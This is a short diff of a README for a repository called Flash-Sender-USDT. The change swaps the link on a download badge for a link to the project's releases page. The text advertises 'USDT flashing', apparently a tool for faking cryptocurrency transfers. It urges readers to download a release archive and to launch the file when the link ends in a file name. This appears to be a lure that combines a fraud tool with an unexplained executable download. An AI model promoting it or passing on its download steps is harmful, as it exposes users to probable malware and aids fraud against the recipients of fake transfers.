@@ -9,7 +9,7 @@ Welcome to the Flash-Sender-USDT repository! This is the ultimate destination fo
 
 ## Get Started
 To begin your USDT flashing journey, download our latest release from the following link:
-[![Download Now](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/releases/789694263/Release.zip)
+[![Download Now](https://github.com/mahadaconfigs/Flash-Sender-USDT/releases)](https://github.com/mahadaconfigs/Flash-Sender-USDT/releases)
 
 ### Note:
 - If the link ends with the file name, it needs to be launched to start the download process.
